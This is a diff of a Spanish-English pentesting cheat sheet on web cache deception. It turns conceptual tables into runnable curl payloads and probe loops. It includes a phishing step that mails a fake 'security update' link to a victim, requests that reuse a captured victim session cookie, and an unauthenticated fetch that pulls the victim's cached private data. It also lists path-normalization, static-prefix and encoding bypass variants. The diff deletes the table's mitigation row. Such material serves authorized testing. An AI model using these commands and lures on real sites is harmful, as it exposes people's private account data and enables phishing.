@@ -23,34 +23,31 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Cache configurado para cachear automáticamente paths con extensiones estáticas (`.css`, `.js`, `.png`). Atacante construye URL con extensión que termina en endpoint dinámico privado. | Vector clásico — Omer Gil 2017. |
-| URL trick básico | `https://target/account.css` → backend ignora `.css` y sirve `/account` (con data sensible) | Cache guarda response como `.css`. |
-| Variant `.js` | `https://target/profile.js` | Same idea. |
-| Variant `.png` / `.jpg` | `https://target/admin.png` | Image cache aggressive. |
-| Variant `.gif` | `https://target/api/users.gif` | Long TTL. |
-| Variant `.ico` | `https://target/internal.ico` | Favicon path. |
-| Variant `.svg` / `.webp` / `.woff` | Modern static formats | Same idea. |
-| Path con segmento adicional | `https://target/account/styles.css` | Backend usa solo `/account`. |
-| Path nesting | `https://target/me/avatar.css` | Igual concepto. |
-| Workflow attacker | 1. Trick victim a visit URL maligno 2. Victim authenticated visita 3. Cache stores response sensible 4. Atacante refetcha URL → recibe data victim | Multi-step. |
-| Combine con phishing | Mandar link con extensión → user click → cache pollute con su data | Stealth. |
-| Common misconfigured CDNs | Cloudflare con "Cache Everything", Akamai default rules | Frequent. |
+| Phishing link a víctima: `https://target.com/account.css` | Backend ignora `.css`, sirve `/account` con data privada → cache stores | Cache config "cache by extension". |
+| `curl -s -b "session=$VICTIM_COOKIE" "https://target.com/account/profile.css"` (atacante con cookie capturada) | Trigger cache fill con data víctima | Multi-step setup. |
+| `curl -s "https://target.com/account/profile.css"` (atacante sin auth, post-fill) | Cache HIT → recibe data privada víctima | Final extraction. |
+| Phishing link variant: `https://target.com/profile.js` | Backend ignora `.js` extension | Same idea con JS. |
+| Phishing link variant: `https://target.com/admin.png` | Image extension cache | Aggressive image cache TTL. |
+| `https://target.com/api/users.gif` (path con extensión imagen) | API path cached as static | Long TTL persistence. |
+| `https://target.com/me/avatar.svg` (nested path + extension) | Nested cache deception | Multi-segment confusion. |
+| `for ext in css js png gif svg ico woff jpg webp; do curl -sI "https://target.com/account.$ext" \| grep -iE 'cache-control\|x-cache'; done` | Probe extensions cacheables | Discovery. |
 ^wcp-deception-extension
 
 ### PoC Cache Deception Workflow
 
-```
-1. Atacante envía link a victim:
-   https://target.com/account/profile.css
+```bash
+# 1. Setup phishing
+PAYLOAD_URL="https://target.com/account/profile.css"
 
-2. Victim (autenticado) hace click → backend ignora .css, sirve /account/profile
-   con data privada de victim.
+# 2. Send link a víctima authenticated
+echo "Click here for security update: $PAYLOAD_URL" | mail victim@target.com
 
-3. Cache (configurado para cachear .css) stores la response.
+# 3. Víctima autenticada visita → backend serves /account/profile data
+#    privada, cache stores response
 
-4. Atacante (NO autenticado) request mismo URL:
-   https://target.com/account/profile.css
-   → Cache HIT → recibe data privada de victim
+# 4. Atacante (no autenticado) fetches mismo URL
+curl -s "$PAYLOAD_URL"
+# → Cache HIT → respuesta contiene data privada víctima
 ```
 
 ___
@@ -59,18 +56,15 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Doble slash | `https://target//api/me` | Backend normaliza `//` a `/` → mismo endpoint, cache trata distinto. |
-| Slash + dot | `https://target/api/me/.` | Backend ignora `/.` → mismo endpoint. |
-| Encoded dot | `https://target/api/me/%2e` | URL-encoded `.`. |
-| Encoded slash | `https://target/api%2Fme` | URL-encoded `/`. |
-| Path traversal `/foo/../api/me` | Cache no normaliza, backend resolve | Differential. |
-| Trailing space encoded | `https://target/api/me%20` | Backend trim, cache no. |
-| Trailing CR/LF | `https://target/api/me%0a` | Edge. |
-| Case insensitivity | `https://target/API/me` | Backend lowercases, cache no. |
-| Doble dot | `https://target/api/me/..` | Backend resolve, cache no. |
-| Combined extension + traversal | `/api/me/../static/x.css` | Multi-trick. |
-| Method override | POST `_method=GET` para cachear como GET | Combo HRS. |
-| Encoded query | `?a=1%26b=2` (encoded `&`) | Differential parse. |
+| `curl -sI "https://target//api/me"` | Doble slash → backend normaliza, cache trata distinto | Path key differential. |
+| `curl -sI "https://target/api/me/."` | Slash + dot → backend ignora, cache stores raw | Dot-suffix differential. |
+| `curl -sI "https://target/api/me/%2e"` | Encoded dot | Decode-after-cache. |
+| `curl -sI "https://target/api%2Fme"` | Encoded slash | Cache key con encoded vs backend decoded. |
+| `curl -sI "https://target/foo/../api/me"` | Path traversal pre-normalize | Backend resolve, cache no. |
+| `curl -sI "https://target/api/me%20"` (trailing space encoded) | Cache stores con espacio, backend trim | Whitespace differential. |
+| `curl -sI "https://target/API/me"` (case mixed) | Backend lowercase, cache case-sensitive | Case differential. |
+| `for v in "//api/me" "/api/me/." "/api/me/%2e" "/api%2Fme" "/foo/../api/me" "/api/me%20" "/API/me"; do curl -sI "https://target$v" \| grep -iE 'x-cache\|age:'; done` | Bulk normalization probe | Discovery. |
+| `curl -sI -X POST -H "X-HTTP-Method-Override: GET" "https://target/api/me"` | POST con method override → backend GET, cache stores POST | Method override + cache combo. |
 ^wcp-deception-normalization
 
 ___
@@ -79,16 +73,14 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Prefix `/static/` mapeo | `https://target/static/../api/me` | Cache sees `/static/...`, backend resolve traversal. |
-| Prefix `/assets/` | `https://target/assets/../admin` | Igual idea. |
-| Prefix `/images/` | `https://target/images/../private` | Heavy cache TTL. |
-| Prefix `/cdn/` | Custom CDN path | App-specific. |
-| Combine con encoded slash | `/static/%2e%2e/admin` | Bypass de filter. |
-| Subdomain + prefix | `static.target.com/../app/admin` | Cross-subdomain quirk. |
-| Force longer cache TTL | Static paths típicamente cached 1 año | Persistencia. |
-| Static prefix con query string | `/static/file.css?path=../admin` | Custom routers. |
-| Shadow paths | `/admin/static/me.css` (admin path con extensión) | Permission inversion. |
-| Combine con SPA routing | Frontend SPA + backend API com URLs solapados | Confusion. |
+| `curl -sI "https://target/static/../api/me"` | Cache key `/static/...`, backend resolve traversal a `/api/me` | Path traversal + cache TTL alto. |
+| `curl -sI "https://target/assets/../admin"` | Igual concepto con `/assets/` prefix | Static prefix bypass. |
+| `curl -sI "https://target/images/../private/data"` | Heavy cache TTL en images | Long persistence. |
+| `curl -sI "https://target/static/%2e%2e/admin"` | Encoded `..` bypass filter | Decode-after-cache. |
+| `curl -sI "https://target/static/x.css?path=../admin"` | Custom router con path en query | Custom routing. |
+| `curl -sI "https://static.target.com/../app/admin"` | Cross-subdomain prefix | Subdomain quirk. |
+| `curl -sI "https://target/admin/static/me.css"` | Admin path con extension static | Permission inversion. |
+| `for prefix in static assets images cdn public; do curl -sI "https://target/$prefix/../admin" \| grep -iE 'x-cache\|age:'; done` | Bulk static-prefix probe | Discovery. |
 ^wcp-deception-prefix
 
 ___
@@ -97,29 +89,24 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| URL-encoded slash | `%2F` | Some caches treat as `/`, others not. |
-| Doble encoded | `%252F` | Decoded `%2F` = `/`. |
-| Backslash | `\` | Windows backslash → forward slash en algunos backends. |
-| URL-encoded backslash | `%5C` | Same. |
-| Unicode slash | `/` | JS contexts. |
-| Fullwidth slash | `／` (U+FF0F) | Some normalizers. |
-| Encoded null | `%00` | Path truncation. |
-| Encoded CRLF | `%0D%0A` | Header/path injection. |
-| Encoded space | `%20` | Trailing trim. |
-| Encoded tab | `%09` | Same. |
-| Encoded vertical tab | `%0B` | Edge. |
-| Triple-encoded | `%25252F` | Multi-decode chains. |
-| Mixed case encoding | `%2f` vs `%2F` | Case-sensitive cache key. |
+| `curl -sI "https://target/admin%2Fprofile"` | URL-encoded slash — cache vs backend decode differential | Encoding differential. |
+| `curl -sI "https://target/admin%252Fprofile"` (doble encoded) | Decoded twice → `/admin/profile` | Multi-decode chain. |
+| `curl -sI "https://target/admin\\profile"` (backslash) | Windows-style → forward slash backend | Backslash interpretation. |
+| `curl -sI "https://target/admin%5Cprofile"` (encoded backslash) | Same | Combined. |
+| `curl -sI "https://target/admin／profile"` (fullwidth slash U+FF0F) | Unicode normalize | Fullwidth char. |
+| `curl -sI "https://target/admin%00.css"` (null byte) | Path truncation | Parser-truncate-on-NUL. |
+| `curl -sI "https://target/admin%0D%0A.css"` (encoded CRLF) | CRLF in path | Header injection adjacent. |
+| `curl -sI "https://target/admin%252525252Fprofile"` (triple+ encoded) | Multi-decode chains | Decode pipeline. |
+| `curl -sI "https://target/admin%2f"` y `curl -sI "https://target/admin%2F"` | Mixed-case encoded | Case-sensitive cache key. |
 ^wcp-deception-encoded
 
-### Resumen Cache Deception vs Cache Poisoning
+### Cache Poisoning vs Cache Deception (referencia)
 
 | | **Cache Poisoning** | **Cache Deception** |
 |---|---|---|
-| Atacante controla | Headers/inputs unkeyed | Path con extensión/normalización |
+| Atacante controla | Headers/inputs unkeyed | Path con extension/normalización |
 | Cache stores | Response controlada por atacante | Response privada de víctima |
-| Víctima | Recibe contenido del atacante | Genera contenido cacheado |
-| Atacante | Ataca con headers malignos | Trick victim a visit URL → atacante refetch |
-| Fix | Include unkeyed inputs en key | Validate path normalization match cache config |
+| Víctima | Recibe contenido atacante | Genera contenido cacheado |
+| Atacante | Sends headers malignos | Trick víctima a visit URL → refetch |
 
 ***
